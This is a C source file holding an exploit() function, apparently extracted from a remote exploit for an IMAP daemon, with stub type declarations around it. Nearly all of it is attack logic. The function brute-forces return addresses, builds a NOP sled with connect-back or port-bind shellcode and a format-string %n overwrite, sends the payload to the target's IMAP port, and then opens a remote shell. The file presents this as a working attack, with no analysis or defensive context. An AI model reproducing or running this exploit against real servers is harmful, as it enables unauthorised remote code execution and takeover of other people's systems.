
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int temp ;
struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int recvbuf ;
typedef int evilcmd ;


 int AF_INET ;
 int BUFFERSIZE ;
 int ERROR ;
 int PORTBIND ;
 int SOCK_STREAM ;
 int TIMEOUT ;
 int bretaddr ;
 int bzero (char*,int) ;
 scalar_t__ cback ;
 int check (int) ;
 int close (int) ;
 char* conn_back ;
 int connect_timeout (int,struct sockaddr*,int,int ) ;
 int exit (int) ;
 int fflush (int ) ;
 struct hostent* gethostbyname (char*) ;
 int herror (char*) ;
 int htons (unsigned int) ;
 int memcpy (char*,char*,int ) ;
 int memset (char*,int,int) ;
 int perror (char*) ;
 char* port_bind ;
 int pos ;
 int printf (char*,...) ;
 scalar_t__ read (int,char*,int) ;
 int shaddr ;
 int shell (char*,int ) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,...) ;
 int stdout ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 int strncat (char*,char*,int) ;
 scalar_t__ write (int,char*,int ) ;

void exploit(char *host, unsigned int imapdport) {
 char evilcmd[BUFFERSIZE], temp[BUFFERSIZE], recvbuf[BUFFERSIZE];
 int cn1, cn2, cn3, cn4, sockfd, retaddr;
 unsigned int bal1, bal2, bal3, bal4;
 struct hostent *he;
 struct sockaddr_in dest_dir;

 if((he=gethostbyname(host)) == ((void*)0)) {
  herror(" gethostbyname()");
  printf("\n");
  exit(1);
        }

 for(retaddr=bretaddr; retaddr>=(bretaddr-500); retaddr -= 4) {

  printf(" [*] searching ret address...\t: %010p", retaddr);
  fflush(stdout);

  bzero(evilcmd, sizeof(evilcmd));
  memset(evilcmd, 0x90, 496);

  if(cback) memcpy(evilcmd + 350, conn_back, strlen(conn_back));

  else memcpy(evilcmd + 350, port_bind, strlen(port_bind));

  bzero(temp, sizeof(temp));
  sprintf(temp, "%s", &retaddr);
  strncat(evilcmd, temp, 4);
  retaddr++;
  sprintf(temp, "%s", &retaddr);
  strncat(evilcmd, temp, 4);
  retaddr++;
  sprintf(temp, "%s", &retaddr);
  strncat(evilcmd, temp, 4);

  bal1 = (shaddr & 0xffff0000) >> 16;
  bal2 = (shaddr & 0x0000ffff);

  cn1 = bal2 - 496 - 12;
  cn1 = check(cn1);
  cn2 = bal1 - bal2;
  cn2 = check(cn2);

  sprintf(temp, "%%%du%%%u$n%%%du%%%u$n", cn1, pos, cn2, pos+2);
  strcat(evilcmd, temp);
  strcat(evilcmd, "\n");

  if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
   perror(" socket");
   printf("\n");
   exit(1);
  }

  dest_dir.sin_family = AF_INET;
  dest_dir.sin_port = htons(imapdport);
  dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
  bzero(&(dest_dir.sin_zero), 8);

  if(connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
   sizeof(struct sockaddr), TIMEOUT) == ERROR) {

   printf(" closed\n\n");
   exit(1);
  }

  if (read(sockfd, recvbuf, sizeof(recvbuf)) <= 0) {
   perror(" read()");
   printf("\n");
   exit(1);
  }

  if (write(sockfd, evilcmd, strlen(evilcmd)) <= 0) {
   perror(" write()");
   printf("\n");
   exit(1);
  }

  close(sockfd);

  if(cback) {
   printf("\r\r");
   continue;
  }

  else shell(host, PORTBIND);

  retaddr -= 2;
 }

 if(cback) printf("\n\n [!] finished!\n\n");

 else printf("\n\n [!] failed!\n\n");
}
